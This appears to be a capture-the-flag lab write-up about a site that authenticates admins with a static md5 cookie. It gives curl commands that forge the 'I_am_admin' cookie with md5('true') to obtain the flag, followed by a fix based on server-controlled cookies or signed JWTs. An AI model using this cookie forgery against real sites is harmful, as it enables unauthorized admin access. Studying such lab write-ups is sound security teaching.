# Insecure admin cookie authentication

## 📖 Vulnerability Explanation
The admin cookie is set to a static hash value, which can be modified by the user. This can lead to unauthorized access to admin protected resources.

## ⚙️ Exploitation Process
The token used to authenticate as an admin in the page is an md5 hash. 

In order to crack it, we can use system tools, such as ```john``` or ```hashcat```, or online services. We chose https://crackstation.net/ and it revealed that the value for the md5 hash was the string "false".

We can generate a new token with the md5 hash of the string "true" to authenticate as the admin user.

---

**1. Retrieve the token value using curl**

```
curl -s -I 'http://BornToSec.com/index.php'
```

---

**2. Check the hash value**

![](./CrackStation.png)

---

**3. Generate the new hash for the token:**

```
echo -n 'true' | md5sum
```

---

**4. Setting the value to the hash of the string "true" gives us the flag:**

```
curl -s -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://BornToSec.com/index.php' | grep Flag
```

## 🧰 Additional Resources Used
We used ```https://crackstation.net/``` to crack the hash. This page doesn't really _crack_ the hash you provide, but performs a lookup on pre-computed hashes instead.

## 🔧 Fix
The server should set the cookie for admin users after authentication. The value should not be a static hash, but a cookie controlled by the system with an expiry date.

## ☝️🤓 Advanced explanation
We advise using a **Json Web Token (JWT)** to protect the authentication system and keep the admin check implementation. This token would be signed by the server and it would also contain information about the user, such as their permissions.
This approach requires a secret to sign the tokens, but it requires less computational resources, as it avoids storing cookies in memory and querying the database to check if a user is an admin.

The json content of the JWT would look like this: 
```
{
    "email": "svetlana@BornToSec.com",
    "isAdmin": true
}
```